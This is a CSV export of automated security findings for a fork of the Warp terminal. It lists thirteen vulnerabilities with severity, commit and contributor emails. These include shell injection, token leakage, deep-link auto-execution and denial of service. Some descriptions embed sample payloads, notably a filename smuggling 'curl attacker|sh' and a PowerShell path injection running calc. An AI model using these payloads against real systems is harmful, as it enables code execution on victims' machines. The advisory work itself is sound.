finding_url,repository,repository_url,title,description,severity,status,detected_at,committed_at,author_email,assignee_name,assignee_email,has_patch,configured_scan_id,commit_hash,relevant_paths,resolution_reason
https://chatgpt.com/codex/cloud/security/findings/b1c39c1fa1dc8191800548f7bb573f1d,pc-style/warp,https://github.com/pc-style/warp,Codex resume trusts transcript cwd while unsandboxed,"The new Codex resume implementation fetches a stored Codex transcript, writes its JSONL entries back under `~/.codex/sessions`, and then executes `codex resume --dangerously-bypass-approvals-and-sandbox`. Unlike the Claude resume path, the Codex runner ignores the supplied `working_dir` parameter and does not rewrite the JSONL `session_meta.payload.cwd` or otherwise validate it against the current run directory before rehydration. Since the Codex resume state is the JSONL file itself, a stale, corrupted, or attacker-controlled accessible transcript can carry an arbitrary prior `cwd` into the resumed CLI. Combined with the dangerous bypass flag, the resumed agent may read, modify, or exfiltrate files from a directory other than the directory the user selected for the run.",high,new,2026-05-08T04:52:25.517447Z,2026-05-01 15:01:51 -0700,56806227+liliwilson@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,70c725ffce3a00495944076418fcebe8eab62aa9,app/src/ai/agent_sdk/driver/harness/codex.rs | app/src/ai/agent_sdk/driver/harness/codex_transcript.rs,
https://chatgpt.com/codex/cloud/security/findings/6dae55da0570819189da4f7d3d123a3b,pc-style/warp,https://github.com/pc-style/warp,Stale cloud worker host can route agents to prior self-hosted host,"This commit moves cloud-agent worker host selection into persistent UI/view-model state. On initialization and on UserWorkspacesEvent::TeamsChanged, the code computes an effective host from WARP_CLOUD_MODE_DEFAULT_HOST or the current workspace default_host_slug, but only calls set_default_host and set_worker_host when that value is Some. If the effective host later becomes None, the old HostSelector.default_host and AmbientAgentViewModel.worker_host remain unchanged. reset_for_new_cloud_prompt also leaves worker_host intact, and spawn_agent sends the stale worker_host in AgentConfigSnapshot. As a result, after a workspace/team switch or an admin removing default_host_slug, subsequent cloud agents can still be dispatched to the previous self-hosted worker even though the current workspace has no default host. If a user was previously in a workspace controlled by an attacker or untrusted admin, prompts/attachments/execution may be routed to that prior self-hosted worker after switching into another context.",high,new,2026-05-08T05:00:15.919088Z,2026-04-30 19:24:25 -0500,40919306+abhishekp106@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,10ec3d1339bb19b4e993247e746de497b7c829aa,app/src/terminal/input.rs | app/src/terminal/view/ambient_agent/host_selector.rs | app/src/terminal/view/ambient_agent/model.rs,
https://chatgpt.com/codex/cloud/security/findings/a9fa60c21d788191b57d7f900a2af022,pc-style/warp,https://github.com/pc-style/warp,FreeBSD external-editor path enables shell injection,"FreeBSD is now routed into `app/src/util/file/external_editor/linux.rs`. That implementation expands FreeDesktop `.desktop` Exec field codes by concatenating raw file paths into a command string and then runs it via `sh -c`. A malicious repository or archive can contain a file whose name includes shell metacharacters, such as `file.rs; curl attacker|sh #`. If the victim opens that file with a supported external editor whose `.desktop` Exec uses `%f`, `%F`, `%u`, or `%U`, the injected shell syntax is interpreted by `sh -c` and executes with the user's privileges. This shell-injection primitive already exists in the Linux implementation, but this commit newly exposes it on FreeBSD by widening the cfg guards and dispatch path.",high,new,2026-05-08T05:03:08.749677Z,2026-04-30 17:02:59 -0400,hello@rudrabhoj.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,e6098a8aef18e6c463d03a591ff266bcac01d2ac,app/src/util/file/external_editor/mod.rs | app/src/util/file/external_editor/linux.rs,
https://chatgpt.com/codex/cloud/security/findings/8fd0a9b9d63081918ab2f6edc750bdcb,pc-style/warp,https://github.com/pc-style/warp,warp:// path links can auto-execute local scripts,"The new helper is described as handling file:// opens, but open_file is also used for custom warp:// action deep links. A remote page or document can initiate a registered warp://action/new_tab?path=... or warp://action/new_window?path=... URL. The handler expands a leading ~, accepts the arbitrary path, and calls open_file. After this commit, common script files are classified as ExecuteInSession: on Unix, executable .sh/.bash/.zsh/.fish/.ksh or executable shebang files; on Windows, any .ps1/.bat/.cmd. The ExecuteInSession branch queues the path as a terminal pending command, and Warp's terminal later executes pending commands on bootstrap/block completion. Thus a deep link to a local attacker-controlled script that previously opened in the editor can now execute in the user's shell without an in-app confirmation. The broader executor sink for non-openable/binary files appears to have pre-existed, but this commit newly expands it to common text script formats reachable through warp:// deep links.",high,new,2026-05-08T05:15:15.628528Z,2026-04-30 11:30:38 -0700,45719782+amriksingh0786@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,edac6515e8359b37601512578e3448ae5fe8c38e,app/src/uri/mod.rs | app/src/util/openable_file_type.rs | app/src/terminal/view.rs | app/src/terminal/input.rs,
https://chatgpt.com/codex/cloud/security/findings/04661e95a9f08191acde3414a1f0a89b,pc-style/warp,https://github.com/pc-style/warp,SSH remote server trusts preexisting remote binaries,"The new release flag rollout makes `FeatureFlag::SshRemoteServer` enabled for all non-Windows release builds. When an SSH session starts, Warp checks only whether the expected remote binary path is executable (`test -x ~/.warp/remote-server/oz`). If it exists, Warp skips the install prompt and immediately launches that binary over SSH as `remote-server-proxy`. During the protocol initialize handshake, Warp sends the current bearer token/API key to the remote process. A malicious or compromised SSH host can pre-place an executable at the expected path, receive the automatic launch, read the first protobuf message from stdin, and steal the user's Warp server token without any remote-server install confirmation. The new control arm does not prevent this because it sets the feature flag on and only changes behavior when the binary is missing; an existing attacker-controlled binary still follows the `Ok(true)` auto-connect path.",high,new,2026-05-08T05:18:44.908350Z,2026-04-29 18:04:17 -0500,kevin@warp.dev,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,9eaee8f605d35dfe6a927f05563b41eab530911e,crates/warp_features/src/lib.rs | app/src/server/experiments/mod.rs | app/src/terminal/writeable_pty/remote_server_controller.rs | crates/remote_server/src/setup.rs | app/src/remote_server/ssh_transport.rs | app/src/remote_server/auth_context.rs | crates/remote_server/src/client/mod.rs,
https://chatgpt.com/codex/cloud/security/findings/0b5592cc530081919cb835ab45382ea4,pc-style/warp,https://github.com/pc-style/warp,Remote reconnect can leak new user's bearer token,"The new remote-server auth flow stores an auth context whose closures read the current AuthState each time they are called. Initial connections capture an identity_key for filtering token rotations, but reconnects reuse the stored transport/auth_context and call run_connect_and_handshake, which fetches the current bearer token and sends it in Initialize without checking that the current identity still matches the session's stored identity_key. SshTransport also derives the remote proxy command from the current auth_context at connect time. As a result, a remote session established under user A can later reconnect after Warp has switched to user B and send user B's bearer token to the remote daemon/host, while the manager still records the session as belonging to user A. The explicit identity filter in rotate_auth_token does not protect the initialize handshake used during reconnects.",high,new,2026-05-08T05:37:17.677703Z,2026-04-28 21:31:23 -0500,huang.moira@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,f0c8b7f723b799b1939508d8784fbb32243638e4,app/src/remote_server/auth_context.rs | app/src/remote_server/ssh_transport.rs | crates/remote_server/src/manager.rs | app/src/remote_server/server_model.rs,
https://chatgpt.com/codex/cloud/security/findings/ecfbe2c8d3f481919800a185d58d4f73,pc-style/warp,https://github.com/pc-style/warp,Unauthenticated URI path can auto-run local executables,"The changed function is reached both by file:// URLs and by browser-reachable warp://action/new_tab or warp://action/new_window links with a path query parameter. For non-markdown, non-Warp-openable files, open_file creates a terminal session at the file's parent directory and calls execute_file. execute_file sets the file path as a pending command, and terminal bootstrap/block-completion code later automatically executes pending commands. Before this commit, open_file returned immediately when AuthState::is_logged_in() was false. After the removal, users in loginless/logged-out modes can have an external URI cause Warp to open a terminal and run an existing local executable path without an in-app confirmation. This is especially risky for custom-protocol links from web content, and can become arbitrary code execution if an attacker can get a predictable executable onto the victim system.",high,new,2026-05-08T06:13:48.534052Z,2026-04-28 20:42:23 +0000,roland@warp.dev,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,fc0ce9f8c0c8db2a5e76d3ecabc0c29397cc69ae,app/src/uri/mod.rs | app/src/terminal/view.rs | app/src/terminal/input.rs,
https://chatgpt.com/codex/cloud/security/findings/47a0cc69b3bc8191b25e4dc02f9bc57f,pc-style/warp,https://github.com/pc-style/warp,PowerShell injection in linked worktree branch clicks,"The new branch picker flow reads `git worktree list --porcelain`, stores the resolved worktree path as hidden menu action data, and on click emits `cd <worktree-path>` to the active terminal. The command formatter always uses POSIX single-quote escaping (`'` -> `'\''`) and does not know which shell will execute the command. That quoting is not valid PowerShell escaping, where single quotes are escaped by doubling them. A malicious repository/worktree path such as `C:\tmp\repo';calc;'x` can therefore produce a command like `cd 'C:\tmp\repo'\'';calc;'\''x'`; in PowerShell the backslash does not escape the quote, so the semicolon-delimited payload can be parsed as a separate command. Normal branch names are also formatted through the same shell-agnostic function, but this commit newly introduces the linked-worktree path-to-`cd` action. The fix should generate shell-specific click commands, use PowerShell-safe quoting such as `Set-Location -LiteralPath '<path with '' escaping>'`, or avoid shell interpolation entirely.",medium,new,2026-05-08T03:54:06.862562Z,2026-05-07 18:25:35 -0700,37472123+kranthik10@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,59e802ea2cbc07b79d507391f8df2ad8783daddf,app/src/context_chips/builtins.rs | app/src/context_chips/git_branch_on_click.rs | app/src/context_chips/display_chip.rs | app/src/terminal/input.rs,
https://chatgpt.com/codex/cloud/security/findings/4c3af32fe90c81918485c364763a2686,pc-style/warp,https://github.com/pc-style/warp,Uncapped scrollback reflow on CLI-agent resize,"In the FullGridClearBehavior::Clear resize path, the patch now calls flat_storage.set_columns(num_cols) and immediately returns. FlatStorage::set_columns rebuilds the row index for the new width, which can greatly increase the number of logical rows when resizing to a narrower pane. Unlike the normal resize path, this early path does not call apply_max_rows() after reflow. As a result, an active third-party CLI agent or cloud/shared session with attacker-controlled terminal output can fill scrollback up to the configured limit at a wide width, then trigger or wait for a narrow resize, causing FlatStorage to allocate and expose far more row-index entries than the scrollback cap. This can cause excessive CPU/memory use or a client crash. The original RowIterator crash described by the commit is fixed, but this new uncapped reflow behavior is introduced by the added set_columns call in the early-return path.",medium,new,2026-05-08T04:01:51.136753Z,2026-05-06 23:15:40 +0000,56806227+liliwilson@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,c28fdddbb144a67dfd0d54609097670611992c13,app/src/terminal/model/grid/resize.rs | crates/warp_terminal/src/model/grid/flat_storage/mod.rs,
https://chatgpt.com/codex/cloud/security/findings/9ea94ef199688191a980772d1a8a7e98,pc-style/warp,https://github.com/pc-style/warp,Handshake delay allows remote push-message memory DoS,"Before this change, the manager started draining the client's event receiver as soon as the connection entered Initializing, dropping push events until the session became Connected. The commit moved event stream draining to mark_session_connected so the new post-initialize codebase-index snapshot would not be dropped. However, RemoteServerClient::reader_task still treats any empty-request_id ServerMessage as a push and sends it to an unbounded async_channel. A malicious or compromised remote server can withhold InitializeResponse and stream large or numerous push messages during the 120-second initialize timeout. Because event_rx is not consumed during that window, these events accumulate in memory and can exhaust the local Warp client process. The protocol has a 64 MB per-message cap, but no bound on queued push events.",medium,new,2026-05-08T03:59:54.077830Z,2026-05-06 19:36:55 -0700,huang.moira@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,2e5272dd3371da58ab6ed4de13e1b75f77f9d78a,crates/remote_server/src/client/mod.rs | crates/remote_server/src/manager.rs,
https://chatgpt.com/codex/cloud/security/findings/35f36bcbd55c81919034aa57d565386b,pc-style/warp,https://github.com/pc-style/warp,Local handoff can snapshot wrong local files,"The commit adds `/move-to-cloud` and a footer chip for local-to-cloud handoff, but neither the slash command availability nor the workspace action verifies that the active conversation is from a local session. The handoff path extracts `working_directory` and file paths from the conversation, then calls `derive_touched_workspace`, which walks those paths on the client machine. On submit, the resulting local repo roots and orphan files are uploaded via `upload_snapshot_for_handoff`. In a remote, shared, or cloud-agent conversation, those paths describe another machine/sandbox, but the client treats them as local paths. If they collide with paths on the user's machine, Warp can upload local repo diffs/untracked files or orphan file contents that were not part of the conversation being handed off. The repository snapshot further captures the entire dirty repo diff and untracked non-ignored files, so a single matching cwd can include unrelated local changes.",medium,new,2026-05-08T04:18:53.939900Z,2026-05-05 16:32:28 -0400,65182701+harryalbert@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,74bdbd1d08abce61606b9b76ab98fc05b2044df5,app/src/search/slash_command_menu/static_commands/commands.rs | app/src/ai/blocklist/agent_view/agent_input_footer/toolbar_item.rs | app/src/workspace/view.rs | app/src/ai/blocklist/handoff/touched_repos.rs | app/src/terminal/view/ambient_agent/model.rs | app/src/ai/agent_sdk/driver/snapshot.rs,
https://chatgpt.com/codex/cloud/security/findings/bea1b478a1588191b64a16d1304d8861,pc-style/warp,https://github.com/pc-style/warp,Windows installer disables RedirectionGuard,"The installer now sets `RedirectionGuard=no`. RedirectionGuard is a Windows process mitigation that blocks traversal through symlinks/junctions created by non-admin users, returning ERROR_UNTRUSTED_MOUNT_POINT instead. Disabling it is security-significant because this installer can be run in administrative/all-users mode and performs privileged file copies and recursive deletions under `{app}` and user data paths. If an attacker can plant a reparse point in a selected, existing, or cleanup path that the elevated installer/uninstaller later traverses, those privileged operations can be redirected to protected locations, enabling arbitrary privileged file overwrite or deletion. The new Rust code only logs when the mitigation is present; it does not preserve the mitigation for the installer while preventing inheritance by the launched app.",medium,new,2026-05-08T04:37:25.607870Z,2026-05-04 10:51:33 -0700,8334252+acarl005@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,14e7216c5ee1ab1294d96b70339b5b72baf41361,script/windows/windows-installer.iss | app/src/platform/windows.rs,
https://chatgpt.com/codex/cloud/security/findings/faa63af179d48191bb9ae5741e696377,pc-style/warp,https://github.com/pc-style/warp,Unbounded read of dropped CLI-agent image paths,"The commit adds a new path for image drops while a CLI agent is running: paths with image-looking extensions are passed to `paste_dropped_images_to_cli_agent`, which stats the path and then calls `async_fs::read` to load the entire file before writing it to the clipboard. This cap is ineffective for non-regular files and TOCTOU cases. For example, a symlink named `screenshot.png` pointing to `/dev/zero`, a FIFO, or a file replaced after the metadata check can pass the `meta.len()` test and then cause `async_fs::read` to block indefinitely or allocate until the process runs out of memory. Before this commit, dropping such a path into a long-running CLI-agent prompt would type the escaped path rather than reading file contents in Warp. A malicious repository or local directory can contain an image-extension symlink/special file and induce the user to drag it into an active CLI-agent session, causing a local denial of service. The safer pattern is to reject non-regular files and read from the same opened handle with a hard byte limit, e.g. read at most `MAX_IMAGE_SIZE_BYTES_FOR_CLI_AGENT + 1` bytes and reject if exceeded.",medium,new,2026-05-08T04:47:28.489653Z,2026-05-04 10:01:38 -0700,shags032@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,34f3adc2ac1b6f1f462cb78f5dc2ebe4cc0bac27,app/src/terminal/view.rs | app/src/terminal/view/use_agent_footer/mod.rs | crates/warpui_core/src/clipboard_utils.rs,
